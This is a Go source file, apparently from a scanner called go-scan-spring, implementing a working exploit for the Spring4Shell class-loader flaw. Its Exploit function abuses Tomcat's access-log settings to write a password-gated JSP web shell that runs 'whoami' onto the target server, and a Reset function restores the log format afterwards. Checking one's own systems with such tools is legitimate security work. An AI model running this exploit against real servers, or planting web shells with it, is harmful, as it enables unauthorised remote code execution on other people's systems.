package lib

import (
	"bytes"
	"net/http"
	"net/url"

	"github.com/rs/zerolog"
)

// Processor is a URL processing helper
type Processor struct {
	Logger      *zerolog.Logger
	HTTPClient  *http.Client
	BaseURL     *url.URL
	HTTPMethod  string

	FinalBaselineURL  *url.URL
	FinalSafeURL      *url.URL
	FinalExploitURL   *url.URL
	FinalResetURL     *url.URL
	Verification      string

	// HTTP response codes
	BaselineResponseStatus int
	SafeResponseStatus     int
	ExploitResponseStatus  int
	ResetResponseStatus    int

	// Status
	Working      bool
	Vulnerable   bool
	Exploited    bool

	// Scan Identifier
	Identifier   string
}


func (p *Processor) Baseline() (err error) {
	resp, err := p.HTTPClient.Head(p.BaseURL.String())

	if err != nil {
		return err
	}

	defer resp.Body.Close()

	p.FinalBaselineURL = resp.Request.URL
	p.BaselineResponseStatus = resp.StatusCode

	p.Working = (resp.StatusCode == http.StatusOK)

	return err
}


func (p *Processor) Safe() (err error) {
	baseURL := p.BaseURL.String() + "?" + getSafePayload()

	resp, err := p.HTTPClient.Head(baseURL)

	if err != nil {
		return err
	}

	defer resp.Body.Close()
	
	p.FinalSafeURL = resp.Request.URL
	p.SafeResponseStatus = resp.StatusCode

	p.Vulnerable = (resp.StatusCode == http.StatusInternalServerError)
	
	return err
}


func (p *Processor) Exploit() (err error) {
	exploit := getExploitPayload(p.Identifier)

	payload := ""
	baseURL := p.BaseURL.String()

	if p.HTTPMethod == "GET" {
		baseURL = baseURL + "?" + exploit
	}

	if p.HTTPMethod == "POST" {
		payload = exploit
	}

	req, err := http.NewRequest(p.HTTPMethod, baseURL, bytes.NewBuffer([]byte(payload)))

	// Common headers
	req.Header.Set("Prefix", "<%")
	req.Header.Set("Suffix", "%>//")
	req.Header.Set("Var1", "Runtime")
	req.Header.Set("S4SID", p.Identifier)

	if p.HTTPMethod == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	resp, err := p.HTTPClient.Do(req)

	if err != nil {
		return err
	}

	defer resp.Body.Close()

	p.FinalExploitURL = resp.Request.URL


    exploitURL, err := url.Parse(p.FinalExploitURL.String())
    if err != nil {
		p.Logger.Err(err).Str("FinalExploitURL", p.FinalExploitURL.String()).
				Msg("Couldn't parse URL")
    }

	p.Verification = exploitURL.Scheme + "://" + exploitURL.Host +
					 "/go-scan-spring/" + p.Identifier + "-AD.jsp?pwd=" + p.Identifier
	
	if err != nil {
		p.Logger.Err(err).Msg("Couldn't parse Verification")
    }

	p.ExploitResponseStatus = resp.StatusCode
	p.Exploited = (resp.StatusCode == http.StatusOK)

	return err
}


func (p *Processor) Reset() (err error) {
	exploit := getResetPayload()

	payload := ""
	baseURL := p.BaseURL.String()

	if p.HTTPMethod == "GET" {
		baseURL = baseURL + "?" + exploit
	}

	if p.HTTPMethod == "POST" {
		payload = exploit
	}

	req, err := http.NewRequest(p.HTTPMethod, baseURL, bytes.NewBuffer([]byte(payload)))

	// Common headers
	req.Header.Set("Prefix", "<%")
	req.Header.Set("Suffix", "%>//")
	req.Header.Set("Var1", "Runtime")
	req.Header.Set("S4SID", p.Identifier)

	if p.HTTPMethod == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	resp, err := p.HTTPClient.Do(req)

	if err != nil {
		return err
	}

	defer resp.Body.Close()

	p.ResetResponseStatus = resp.StatusCode
	return err
}


func getSafePayload() (string) {
	return url.QueryEscape("class.module.classLoader.URLs[-1]")
}


func getExploitPayload(identifier string) (string) {
	baseObject := "class.module.classLoader.resources.context.parent.pipeline.first"
	prefix := identifier
	suffix := ".jsp"
	directory := "webapps/go-scan-spring"
	fileDateFormat := "-G"

	pattern := `%{Prefix}i ` +
			   `out.println("<html><body><h1>go-scan-spring-whoami</h1><pre>"); ` +
	           `if("%{S4SID}i".equals(request.getParameter("pwd"))) { ` +
	           `  java.io.InputStream in = %{Var1}i.getRuntime().exec("whoami").getInputStream(); ` +
	           `  int a = -1; ` +
	           `  byte[] b = new byte[2048]; ` +
	           `  while((a=in.read(b))!=-1) { ` +
	           `    out.println(new String(b)); ` +
	           `  } ` +
	           `} else { ` +
	           `  out.println("Wrong or missing password"); ` +
	           `} ` +
	           `out.println("</h1></pre></body></html>"); ` +
	           `%{Suffix}i`

	payload := baseObject + ".prefix=" + prefix + "&" +
			   baseObject + ".suffix=" + suffix + "&" +
			   baseObject + ".directory=" + directory + "&" +
			   baseObject + ".fileDateFormat=" + fileDateFormat + "&" +
			   baseObject + ".pattern=" + url.QueryEscape(pattern)

	return payload
}


func getResetPayload() (string) {
	baseObject := "class.module.classLoader.resources.context.parent.pipeline.first"
	fileDateFormat := "-yyMMdd"

	payload := baseObject + ".fileDateFormat=" + fileDateFormat
	return payload
}
